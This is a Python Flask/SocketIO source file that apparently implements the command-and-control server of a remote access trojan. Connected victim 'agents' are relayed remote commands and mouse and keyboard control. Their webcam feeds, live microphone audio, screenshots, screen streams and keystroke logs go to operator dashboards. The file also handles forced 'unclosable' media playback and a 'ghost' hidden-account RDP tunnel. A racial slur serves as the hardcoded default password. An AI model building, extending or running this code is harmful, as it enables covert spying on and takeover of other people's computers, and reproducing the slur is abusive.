from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room, disconnect
from datetime import datetime
import uuid, os, base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'changeme123'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024   # 100 MB HTTP upload limit

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='threading',
    max_http_buffer_size=100 * 1024 * 1024,
)

# ── Dashboard password ────────────────────────────────────────
DASHBOARD_PASS = os.environ.get('DASHBOARD_PASS', 'youarenigger')
authed_sids = set()

clients    = {}
agent_sids = {}
dashboard_sids = set()

@app.route('/')
def index():
    return render_template('index.html')

# ── HTTP media upload ─────────────────────────────────────────
# Dashboard POSTs the file here over plain HTTP instead of the
# WebSocket, so large files never touch the WS message-size limit.
@app.route('/upload_media/<client_id>', methods=['POST'])
def upload_media(client_id):
    token = request.headers.get('X-Dashboard-Token', '')
    if token != DASHBOARD_PASS:
        return jsonify({'status': 'error', 'msg': 'Unauthorized'}), 403

    if client_id not in agent_sids:
        return jsonify({'status': 'error', 'msg': 'Agent not connected'}), 404

    f = request.files.get('file')
    if not f:
        return jsonify({'status': 'error', 'msg': 'No file provided'}), 400

    ext        = request.form.get('ext', 'mp3')
    unclosable = request.form.get('unclosable', 'false').lower() == 'true'
    rid        = request.form.get('rid', str(uuid.uuid4()))

    data_b64 = base64.b64encode(f.read()).decode()

    socketio.emit('cmd', {
        'client_id':  client_id,
        'action':     'play_media',
        'rid':        rid,
        'data':       data_b64,
        'ext':        ext,
        'unclosable': unclosable,
    }, to=agent_sids[client_id])

    return jsonify({'status': 'ok', 'rid': rid})

# ── Agent events ─────────────────────────────────────────────

@socketio.on('connect')
def handle_connect():
    pass

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    authed_sids.discard(sid)
    for cid, csid in list(agent_sids.items()):
        if csid == sid:
            if cid in clients:
                clients[cid]['status'] = 'offline'
            del agent_sids[cid]
            broadcast_clients()
            break
    dashboard_sids.discard(sid)

@socketio.on('agent_register')
def handle_agent_register(data):
    cid = data.get('client_id', str(uuid.uuid4()))
    agent_sids[cid] = request.sid
    join_room(f'agent_{cid}')
    clients[cid] = {
        'id':           cid,
        'hostname':     data.get('hostname',     'Unknown'),
        'ip':           data.get('ip', request.remote_addr),
        'username':     data.get('username',     'Unknown'),
        'platform':     data.get('platform',     'Unknown'),
        'connected_at': data.get('connected_at', datetime.now().isoformat()),
        'last_seen':    datetime.now().isoformat(),
        'status':       'online',
        'sid':          request.sid,
    }
    broadcast_clients()

# ── Dashboard auth ────────────────────────────────────────────

@socketio.on('dashboard_auth')
def handle_dashboard_auth(data):
    if data.get('password') == DASHBOARD_PASS:
        authed_sids.add(request.sid)
        emit('auth_result', {'ok': True})
    else:
        emit('auth_result', {'ok': False, 'msg': 'Wrong password'})

@socketio.on('dashboard_join')
def handle_dashboard_join():
    if request.sid not in authed_sids:
        emit('auth_required')
        return
    dashboard_sids.add(request.sid)
    join_room('dashboards')
    emit('client_update', {'clients': sanitized_clients()})

@socketio.on('request_clients')
def handle_request_clients():
    if request.sid not in authed_sids:
        emit('auth_required')
        return
    emit('client_update', {'clients': sanitized_clients()})

# ── Dashboard -> Agent relay ──────────────────────────────────

def _check_auth():
    if request.sid not in authed_sids:
        emit('auth_required')
        return False
    return True

@socketio.on('delete_client')
def handle_delete_client(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if not cid:
        emit('cmd_response', {'status': 'error', 'msg': 'No client_id'})
        return
    # Block deletion of online clients
    if cid in agent_sids:
        emit('delete_result', {'status': 'error', 'msg': 'Cannot delete an online client. Disconnect the client first.'})
        return
    if cid in clients:
        del clients[cid]
    if cid in agent_sids:
        del agent_sids[cid]
    emit('delete_result', {'status': 'ok', 'client_id': cid})
    broadcast_clients()

@socketio.on('cmd')
def handle_cmd(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('cmd', data, to=agent_sids[cid])
    else:
        emit('cmd_response', {'client_id': cid, 'rid': data.get('rid',''), 'status': 'error', 'msg': 'Agent not connected'})

@socketio.on('start_stream')
def handle_start_stream(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('start_stream', data, to=agent_sids[cid])

@socketio.on('stop_stream')
def handle_stop_stream(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('stop_stream', data, to=agent_sids[cid])

@socketio.on('mouse_move')
def handle_mouse_move(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_move', data, to=agent_sids[cid])

@socketio.on('mouse_click')
def handle_mouse_click(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_click', data, to=agent_sids[cid])

@socketio.on('mouse_down')
def handle_mouse_down(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_down', data, to=agent_sids[cid])

@socketio.on('mouse_up')
def handle_mouse_up(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_up', data, to=agent_sids[cid])

@socketio.on('mouse_dblclick')
def handle_mouse_dblclick(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_dblclick', data, to=agent_sids[cid])

@socketio.on('mouse_scroll')
def handle_mouse_scroll(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('mouse_scroll', data, to=agent_sids[cid])

@socketio.on('rdp_key_down')
def handle_rdp_key_down(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('rdp_key_down', data, to=agent_sids[cid])

@socketio.on('rdp_key_up')
def handle_rdp_key_up(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('rdp_key_up', data, to=agent_sids[cid])

@socketio.on('rdp_hotkey')
def handle_rdp_hotkey(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('rdp_hotkey', data, to=agent_sids[cid])

@socketio.on('rdp_type')
def handle_rdp_type(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('rdp_type', data, to=agent_sids[cid])

@socketio.on('key_press')
def handle_key_press(data):
    if not _check_auth(): return
    cid = data.get('client_id')
    if cid and cid in agent_sids:
        socketio.emit('key_press', data, to=agent_sids[cid])

# ── Agent -> Dashboard relay ──────────────────────────────────

@socketio.on('webcam_frame')
def handle_webcam_frame(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('webcam_frame', data, to='dashboards')

@socketio.on('mic_live_chunk')
def handle_mic_live_chunk(data):
    socketio.emit('mic_live_chunk', data, to='dashboards')

@socketio.on('mic_data')
def handle_mic_data(data):
    socketio.emit('mic_data', data, to='dashboards')

@socketio.on('auto_screenshot')
def handle_auto_screenshot(data):
    socketio.emit('auto_screenshot', data, to='dashboards')

@socketio.on('screen_frame')
def handle_screen_frame(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('screen_frame', data, to='dashboards')

@socketio.on('chat_reply')
def handle_chat_reply(data):
    socketio.emit('chat_reply', data, to='dashboards')

@socketio.on('keylog_data')
def handle_keylog_data(data):
    socketio.emit('keylog_data', data, to='dashboards')

@socketio.on('cmd_response')
def handle_cmd_response(data):
    cid = data.get('client_id')
    if cid in clients:
        clients[cid]['last_seen'] = datetime.now().isoformat()
    socketio.emit('cmd_response', data, to='dashboards')

@socketio.on('ghost_open_relay')
def handle_ghost_open_relay(data):
    """Agent signals it wants a socket-relay tunnel to its RDP port."""
    cid = data.get('client_id')
    rdp_port = data.get('rdp_port', 3389)
    # Store relay intent — the ghost_viewer page will use WebSocket relay
    if cid in clients:
        clients[cid]['ghost_rdp_port'] = rdp_port
        clients[cid]['ghost_relay_sid'] = agent_sids.get(cid)
    # Tell the agent the relay is ready (port is virtual — we relay via WS)
    if cid in agent_sids:
        socketio.emit('ghost_tunnel_result',
                      {'status': 'ok', 'port': 13389, 'method': 'socket_relay'},
                      to=agent_sids[cid])
    # Also broadcast to dashboards so the dashboard JS gets the event
    socketio.emit('ghost_tunnel_result',
                  {'status': 'ok', 'port': 13389, 'method': 'socket_relay'},
                  to='dashboards')

@socketio.on('ghost_provision_result')
def handle_ghost_provision_result(data):
    socketio.emit('ghost_provision_result', data, to='dashboards')

@socketio.on('ghost_cleanup_result')
def handle_ghost_cleanup_result(data):
    socketio.emit('ghost_cleanup_result', data, to='dashboards')

# ── Ghost viewer page ─────────────────────────────────────────
# A self-contained HTML page that loads noVNC pointing at the tunnel.
# For a real deployment, run a guacamole-lite or xrdp websockify proxy.
# This page gives the operator instructions + a direct RDP file download
# that connects through the tunnel.

@app.route('/ghost_viewer')
def ghost_viewer():
    token = request.args.get('token', '') or request.headers.get('X-Dashboard-Token','')
    # Light auth — pass the dashboard password as a query param
    # (the iframe src is generated server-side with the token embedded)
    cid  = request.args.get('cid', '')
    user = request.args.get('user', '')
    pwd  = request.args.get('pass', '')
    port = request.args.get('port', '13389')

    # Build an .rdp file for download + an auto-connect attempt via mstsc URI
    rdp_content = (
        f"full address:s:127.0.0.1:{port}\r\n"
        f"username:s:{user}\r\n"
        f"password 51:b:{pwd}\r\n"
        f"screen mode id:i:2\r\n"
        f"use multimon:i:0\r\n"
        f"session bpp:i:32\r\n"
        f"compression:i:1\r\n"
        f"keyboardhook:i:2\r\n"
        f"audiocapturemode:i:0\r\n"
        f"videoplaybackmode:i:1\r\n"
        f"connection type:i:7\r\n"
        f"networkautodetect:i:1\r\n"
        f"bandwidthautodetect:i:1\r\n"
        f"displayconnectionbar:i:1\r\n"
        f"enableworkspacereconnect:i:0\r\n"
        f"disable wallpaper:i:0\r\n"
        f"allow font smoothing:i:1\r\n"
        f"allow desktop composition:i:1\r\n"
        f"redirectsmartcards:i:1\r\n"
        f"redirectclipboard:i:1\r\n"
        f"redirectprinters:i:1\r\n"
        f"autoreconnection enabled:i:1\r\n"
        f"authentication level:i:2\r\n"
        f"prompt for credentials:i:0\r\n"
        f"negotiate security layer:i:1\r\n"
        f"remoteapplicationmode:i:0\r\n"
        f"alternate shell:s:\r\n"
        f"shell working directory:s:\r\n"
        f"gatewayusagemethod:i:4\r\n"
        f"gatewaycredentialssource:i:4\r\n"
        f"gatewayprofileusagemethod:i:0\r\n"
        f"promptcredentialonce:i:0\r\n"
        f"drivestoredirect:s:\r\n"
    )
    import base64 as _b64
    rdp_b64 = _b64.b64encode(rdp_content.encode()).decode()

    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Ghost Desktop — {user}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{background:#07080d;color:#e2e8f0;font-family:'Geist Mono',monospace;
      display:flex;flex-direction:column;height:100vh;overflow:hidden;}}
.hdr{{flex-shrink:0;height:40px;background:#0d0f1a;border-bottom:1px solid rgba(255,255,255,0.06);
      display:flex;align-items:center;padding:0 16px;gap:12px;}}
.hdr-title{{font-size:12px;color:rgba(255,255,255,0.6);letter-spacing:0.08em;}}
.hdr-badge{{font-size:9px;padding:2px 8px;border-radius:100px;
            background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.3);
            color:#4ade80;letter-spacing:0.08em;}}
.body{{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
       gap:20px;padding:32px;}}
.card{{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);
       border-radius:10px;padding:24px 28px;max-width:520px;width:100%;}}
.card-title{{font-size:11px;color:rgba(255,255,255,0.4);letter-spacing:0.1em;
             text-transform:uppercase;margin-bottom:16px;}}
.cred{{background:rgba(0,0,0,0.4);border:1px solid rgba(59,130,246,0.25);
       border-radius:7px;padding:12px 16px;font-size:12px;color:#93c5fd;line-height:2.2;}}
.cred .lbl{{color:rgba(255,255,255,0.3);font-size:9px;letter-spacing:0.1em;text-transform:uppercase;}}
.btn{{display:inline-flex;align-items:center;gap:7px;
      padding:10px 20px;border-radius:7px;cursor:pointer;font-family:inherit;font-size:11px;
      letter-spacing:0.06em;border:1px solid;transition:all 0.15s;text-decoration:none;}}
.btn-green{{color:#4ade80;border-color:rgba(34,197,94,0.3);background:rgba(34,197,94,0.1);}}
.btn-green:hover{{background:rgba(34,197,94,0.2);}}
.btn-blue{{color:#60a5fa;border-color:rgba(59,130,246,0.3);background:rgba(59,130,246,0.1);}}
.btn-blue:hover{{background:rgba(59,130,246,0.2);}}
.btns{{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px;}}
.note{{font-size:10px;color:rgba(255,255,255,0.25);line-height:1.8;margin-top:12px;}}
</style>
</head>
<body>
<div class="hdr">
  <div class="hdr-title">👻 GHOST DESKTOP SESSION</div>
  <div class="hdr-badge">LIVE</div>
  <div style="margin-left:auto;font-size:10px;color:rgba(255,255,255,0.3);">Node: {cid[:12]}…</div>
</div>
<div class="body">
  <div class="card">
    <div class="card-title">Ghost Account Credentials</div>
    <div class="cred">
      <div><span class="lbl">Username</span><br>{user}</div>
      <div style="margin-top:8px;"><span class="lbl">Password</span><br>{pwd}</div>
      <div style="margin-top:8px;"><span class="lbl">RDP Port (tunnel)</span><br>127.0.0.1:{port}</div>
    </div>
    <div class="btns">
      <a class="btn btn-green" href="data:application/octet-stream;base64,{rdp_b64}" download="ghost_{user}.rdp">
        ⬇ Download .RDP File
      </a>
      <a class="btn btn-blue" href="rdp://127.0.0.1:{port}" target="_blank">
        🖥 Open mstsc (local)
      </a>
    </div>
    <div class="note">
      ① Click <b style="color:rgba(255,255,255,0.6);">Download .RDP File</b> → open it → Windows Remote Desktop connects automatically.<br>
      ② Or click <b style="color:rgba(255,255,255,0.6);">Open mstsc</b> if you have the SSH tunnel forwarded to localhost:{port}.
    </div>
  </div>
</div>
</body>
</html>"""
    return html

# ── Helpers ───────────────────────────────────────────────────

def sanitized_clients():
    return [{k: v for k, v in c.items() if k != 'sid'} for c in clients.values()]

def broadcast_clients():
    socketio.emit('client_update', {'clients': sanitized_clients()}, to='dashboards')

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
